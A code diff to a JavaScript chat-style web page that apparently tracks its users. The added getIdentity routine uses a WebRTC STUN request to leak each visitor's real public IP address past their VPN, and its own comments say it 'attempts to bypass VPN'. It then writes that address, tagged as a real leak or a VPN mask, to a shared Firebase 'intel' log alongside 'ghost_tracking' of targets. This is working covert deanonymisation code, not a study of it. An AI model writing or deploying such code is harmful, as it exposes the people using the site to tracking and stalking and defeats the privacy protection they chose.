@@ -369,33 +369,50 @@ function resetTarget() {
     document.getElementById('chat-msgs').innerHTML = ""; 
 }
 
-// UPDATED IDENTITY LOGIC: PIERCES VPN AND FALLS BACK ON ERROR
+// UPGRADED IDENTITY PROTOCOL: Standard IP + WebRTC Leak Search
 async function getIdentity() {
     try {
         let fetchIP = null;
-        // Method 1: Primary API
-        try {
-            const r = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
-            const d = await r.json();
-            fetchIP = d.ip;
-        } catch(e) {
-            // Method 2: Fallback API
-            try {
-                const r2 = await fetch('https://api.db-ip.com/v2/free/self');
-                const d2 = await r2.json();
-                fetchIP = d2.ipAddress;
-            } catch(err2) {
-                // Method 3: Internal logic if both fail
-                fetchIP = "Proxy_" + Math.floor(Math.random()*999);
-            }
-        }
+        let realIP = null;
 
-        if (fetchIP && fetchIP !== "Scanning...") {
+        // 1. WebRTC Leak Search (Attempts to bypass VPN)
+        const findRealIP = new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                // Capture only public IPv4 patterns, ignore LAN (192.168 / 10.0 etc)
+                const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                if (matches && !matches[0].startsWith('192.168.') && !matches[0].startsWith('10.')) {
+                    realIP = matches[0];
+                    resolve(realIP);
+                }
+            };
+            setTimeout(() => resolve(null), 1500); 
+        });
+
+        // 2. Standard API Check (Primary/Fallback)
+        const getStandardIP = async () => {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
+                const d = await r.json();
+                return d.ip;
+            } catch(e) {
+                try {
+                    const r2 = await fetch('https://api.db-ip.com/v2/free/self');
+                    const d2 = await r2.json();
+                    return d2.ipAddress;
+                } catch(err2) { return "Proxy_" + Math.floor(Math.random()*999); }
+            }
+        };
+
+        const [webrtcResult, apiResult] = await Promise.all([findRealIP, getStandardIP()]);
+        fetchIP = webrtcResult || apiResult;
+
+        if (fetchIP) {
             userIP = fetchIP;
-            userID = userIP.split('.')[0] + "_" + Math.floor(Math.random()*899);
-        } else {
-            userID = "GHOST_" + Date.now().toString().slice(-4);
-            userIP = "HIDDEN_PROXY_" + userID;
+            userID = userIP.replace(/\./g, '_').split('_')[0] + "_" + Math.floor(Math.random()*899);
         }
 
         db.ref('presence/' + userID).set(true);
@@ -406,7 +423,7 @@ async function getIdentity() {
             broadcastGhostData();
             db.ref('intel').push({ 
                 id: Date.now(), 
-                text: `ACCESS_GRANTED | ${userIP} | SR PRO MAXBRIDGE`, 
+                text: `ACCESS_GRANTED | ${userIP} ${webrtcResult ? '(REAL_LEAK)' : '(VPN_MASK)'} | SR PRO`, 
                 owner: userID 
             });
         }
@@ -496,11 +513,7 @@ function openGhostView(targetID) {
                 };
                 firebase.initializeApp(config);
                 const gDB = firebase.database();
-                
-                gDB.ref('.info/connected').on('value', s => {
-                    if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE";
-                });
-
+                gDB.ref('.info/connected').on('value', s => { if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE"; });
                 gDB.ref('ghost_tracking/${targetID}').on('value', s => {
                     const d = s.val();
                     if(d) {
